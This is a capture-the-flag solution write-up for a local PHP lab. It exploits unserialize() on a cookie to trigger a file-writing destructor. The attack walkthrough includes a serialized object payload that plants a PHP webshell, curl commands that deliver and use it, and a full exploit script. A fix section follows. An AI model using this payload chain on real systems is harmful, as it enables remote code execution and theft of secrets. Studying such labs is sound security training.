# w19 Blob Forge :: solution

## Root cause

`app/index.php` decodes the caller's cookie with the legacy serializer and no
guard whatsoever:

```php
$prefs = @unserialize(base64_decode($raw, true));
```

`unserialize()` does not produce plain data. Given the right string it
*instantiates classes* — here, whatever classes the application already has
loaded — and populates their properties from the attacker's bytes. Among those
classes is one whose destructor has side effects:

```php
public function __destruct()
{
    if (strlen($this->content) === 0) { return; }
    if ($this->ttl === 0) { return; }
    @file_put_contents($this->path, $this->content);
}
```

`$path`, `$content` and `$ttl` are all public properties, so all three are
attacker-controlled. `__destruct()` runs when the request's object graph is torn
down — i.e. at the end of *every* request that carried the cookie. The result is
an **arbitrary file write**, with attacker-controlled bytes and an
attacker-controlled path, running as `www-data`.

Two designs make that write lethal rather than annoying:

- The document root (`/var/www/html`) is owned and writable by `www-data`. The
  Dockerfile does this on purpose: the cache is meant to land beside the app.
  So the written file is not just on disk, it is **served and executed**.
- The flag lives only in the process environment (`W0B_FLAG`), not in any
  web-served file. A file write alone is therefore not enough to finish — the
  player must turn it into code execution.

The two guards in `__destruct` (`strlen($content) === 0` and `$ttl === 0` are
purge sentinels) matter: a payload that leaves either at its default writes
nothing, silently. They are what makes this "medium" rather than "copy the
serialized string off a blog".

## Recon

The landing page names the endpoints, the cookie, and the serializer:

```bash
curl -s http://localhost:30019/api/health
# {"service":"blob-forge","lab":"w19","version":"0.19.3","php":"8.3.x","serializer":"php-serialize"}
```

`/api/prefs` is the reflection that makes the deserialization *observable* — it
hands back the result of the decode, so you can watch the class rebuild instead
of guessing. Start with a benign array blob:

```bash
B=$(printf 'a:1:{s:5:"theme";s:4:"dark";}' | base64 -w0)
curl -s -b "prefs=$B" http://localhost:30019/api/prefs
# {"decoded":{"theme":"dark"},"type":"array","fields":null}
```

Now send a serialized **object** and watch the type change:

```bash
B=$(printf 'O:8:"stdClass":1:{s:1:"a";i:1;}' | base64 -w0)
curl -s -b "prefs=$B" http://localhost:30019/api/prefs
# {"decoded":{"a":1},"type":"stdClass","fields":{"a":1}}
```

The server happily instantiates the class named in your string. It only refuses
when the class is not defined. The application's own class list is one file —
`PreferenceCache` (with its `__destruct`) and `GhostSession`.

## Building the payload

`PreferenceCache` serialized with `path = /shell.php`,
`content = <?php system($_GET["x"]); ?>`, `ttl = 3600`:

```
O:15:"PreferenceCache":3:{s:4:"path";s:10:"/shell.php";s:7:"content";s:30:"<?php system($_GET["x"]); ?>";s:3:"ttl";i:3600;}
```

`solution/payload.php` emits exactly that, base64'd, without needing the class
to be loaded locally:

```bash
php solution/payload.php -p /shell.php -c '<?php system($_GET["x"]); ?>'
# TzoxNToiUHJlZmVyZW5jZUNhY2hlIjozOntzOjQ6InBhdGgiO3M6MTA6Ii9zaGVsbC5waHAiO3M6
# NzoiY29udGVudCI7czozMDoiPD9waHAgc3lzdGVtKCRfR0VUWyJ4Il0pOyA/PiI7czozOiJ0dGwi
# O2k6MzYwMDt9
```

Note the string lengths. PHP's `s:N:"..."` length prefix must count bytes, not
characters, and a mismatch makes `unserialize` fail — the reflection endpoint
will tell you so instead of silently doing nothing. This is the single most
common reason a hand-built payload "does not work".

## Exploit

Deliver the cookie; `__destruct()` fires as the request unwinds:

```bash
PAYLOAD=$(php solution/payload.php -p /shell.php -c '<?php system($_GET["x"]); ?>')
curl -s -o /dev/null -b "prefs=$PAYLOAD" http://localhost:30019/api/prefs
```

The server has now written `/var/www/html/shell.php`. Use it:

```bash
curl -s 'http://localhost:30019/shell.php?x=id'
# uid=33(www-data) gid=33(www-data) groups=33(www-data)

curl -s --get --data-urlencode 'x=printenv W0B_FLAG' http://localhost:30019/shell.php
# hex4b0t{...}
```

or run the whole chain:

```bash
bash solution/exploit.sh
# [*] target http://localhost:30019
# [*] cookie prefs=TzoxNToiUHJlZmVyZW5jZUNhY2hlIjozOntzOjQ6InBhdGgiO3M6MTA...
# [+] w19 shell -> http://localhost:30019/shell.php
# [+] FLAG: hex4b0t{verifytest123456}
```

### Where the flag actually comes from

`W0B_FLAG` is an environment variable on the container. Nothing in the lab ever
writes it to disk or prints it. Reading it from the shell is
`printenv W0B_FLAG`.

This is worth being explicit about because the *obvious* route does not work
here. The container's `/proc/self/environ` is **empty of the variable**: the
`php:8.3-apache` image turns on Apache's `ClearEnv`, which scrubs the
environment when the worker starts, so `/proc/self/environ` and the CLI-only
`$_SERVER` superglobal both come up blank. `getenv()` inside mod_php is the path
that survives, and `app/config.php` uses precisely that:

```php
$flag = getenv('W0B_FLAG');
```

(The visibility was tested against `php:8.3-apache` before the lab was built,
rather than assumed.)

A shell therefore has two ways to reach it: `printenv W0B_FLAG`, or the same
`getenv('W0B_FLAG')` call from a PHP file — which is what makes a *PHP* webshell
the natural payload rather than a plain shell.

## The fix

Deserialization of untrusted input is the bug; both halves of it are avoidable.

1. **Never `unserialize()` attacker-controlled bytes.** Preferences are data.
   Use `json_decode($decoded, true, 512, JSON_THROW_ON_ERROR)`, which cannot
   instantiate anything:

   ```php
   $prefs = json_decode($decoded, true, 512, JSON_THROW_ON_ERROR);
   ```

   If the blob must stay PHP-serialized for legacy backups, decode it with
   `unserialize($decoded, ['allowed_classes' => false])` so only arrays, scalars
   and `__PHP_Incomplete_Class` stubs come back — no magic methods, no
   destructors:

   ```php
   $prefs = unserialize($decoded, ['allowed_classes' => false]);
   ```

2. **Magic methods must not act on attacker-controlled destinations.** A
   `__destruct()` that calls `file_put_contents($this->path, $this->content)` is
   a file-write primitive wearing a cache's clothes. If an object must persist
   itself, the path has to be an allowlisted constant, or a key looked up in a
   server-side table — never a property that arrived over the wire.
3. **Do not make the document root writable by the web server.** The write here
   only becomes code execution because `/var/www/html` is `www-data`-owned.
   Cache belongs in a directory the server will not execute from
   (`/var/lib/blob-forge/cache`, `php_admin_value open_basedir` scoped around
   it). A file write that cannot be served is a much smaller bug.
4. **Defence in depth:** if the flag must live in the environment, remember it
   is one `system()` away from anyone who gets code execution. The real control
   is not shipping code-execution primitives (this one) in the first place; the
   environment is a convenience, not a boundary.

## Flag

Injected at runtime into `W0B_FLAG`. There is no static value to hardcode, and
the flag is not written to any file the web server serves — reaching it requires
executing code in the container.

## Submit

```bash
./manage.sh submit 'hex4b0t{...}' ai-pilot
```
